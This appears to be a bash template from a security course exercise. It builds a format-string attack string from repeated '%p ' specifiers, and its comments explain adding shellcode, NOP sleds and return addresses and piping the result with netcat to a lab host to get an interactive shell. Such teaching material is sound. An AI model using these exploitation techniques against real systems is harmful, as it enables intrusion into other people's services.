#!/bin/bash

# check if first argument is specified
if [ -z "$1" ]; then
    echo "Specify number of "'"%p "'" to print as $0 <num>" >&2
    exit 1
fi

#
# Source the shell-rc file if you want access to the functions therein.
# `.` is the shorthand command for sourcing a file,
# `./shell-rc` refers to the file `shell-rc` in the *current* directory `./`
#
. ./shell-rc

### Examples useful for shell programming: ##################################
#                                                                           #
## You can assign the output of a shell command to a variable as follows:   #
#                                                                           #
# variable="$(echo bla)"                                                    #
#                                                                           #
## Append the output of a shell command to a variable as follows:           #
#                                                                           #
# variable="${variable}$(echo bla)"                                         #
#                                                                           #
## Append a string 'str' to a variable as follows:                          #
#                                                                           #
# variable="${variable}str"                                                 #
#                                                                           #
## Prepend a str 'str' to a variable as follows:                            #
#                                                                           #
# variable="str${variable}"                                                 #
#                                                                           #
#############################################################################

attackstr=""

# Print some "%p "s (see the $1 in the argument to seq!)
for i in $(seq 1 $1); 
do 
    attackstr="${attackstr}%p "
done

# This is probably a good place to add some other commands.
# Ideas:
# - An argument that generates the right shellcode
# - An argument that specifies the number of NOPs preceding the shellcode
# - Handle the return address

# This next echo statement ends with >&2, which is some magic that redirects the output to stderr.
# Tells you the size (in bytes) of the entire attack string.
# Note that if it contains a NULL byte (or, with gets, a newline) it will not overflow
# that many bytes of buffer.
echo "Attackstring is $(echo -n "$attackstr" | wc -c) bytes" >&2  # print to stderr


### How to get the resulting attack string into the vulnerable process ######
#                                                                           #
## You can either redirect the output of this script directly into the      #
## vulnerable process by running it on the commandline as:                  #
# ./attack.sh 10 | nc hackme.rded.nl 54321                                  #
#                                                                           #
## Or you can start the process from within the script and do that          #
## redirection internally.                                                  #
#                                                                           #
## Examples of both ways below.                                             #
#                                                                           #
#############################################################################

# This echo's attackstr to the stdout of the script, so you can run it as
# ./attack.sh 10 | nc hackme.rded.nl 54321
# Note that echo also writes a newline at the end. If you're attacking gets,
# that's probably what you want, but otherwise, you may need "echo -n" to
# suppress the newline.
echo "$attackstr"

# Following echoing the attack string, if you're executing the /bin/sh
# shellcode, you probably want to be able to type commands. You can do this
# from outside the script by running it as
# (./attack.sh 10; cat -) | nc hackme.rded.nl 54321
# but you can also make the script itself redirect its stdin to stdout by
# enabling the following line:
#cat -
# Close the input with ctrl+D when you're done, or need to execute some more
# code underneath it.

### Examples to run the netcat process from within the script ###############
#                                                                           #
## This invocation echo's attackstr directly into a new connection to the   #
## vulnerable program, then closes the input. You cannot give any input     #
## after it. Might be useful if you want to use a loop...                   #
## Enable it if you want to run the /bin/ls shell code (./shellcode list)   #
## and remember to set PORT to the right port somewhere.                    #
# echo "$attackstr" | nc hackme.rded.nl ${PORT}
#                                                                           #
## The following composed command allows stdin to remain open, which would  #
## otherwise have been closed by the EOF sent by echo.                      #
## Can be used to run the /bin/sh shell code (./shellcode shell)            #
## Remember you can close cat's input using ctrl+D.                         #
# (echo "$attackstr"; cat -) | nc hackme.rded.nl ${PORT}
#                                                                           #
#############################################################################
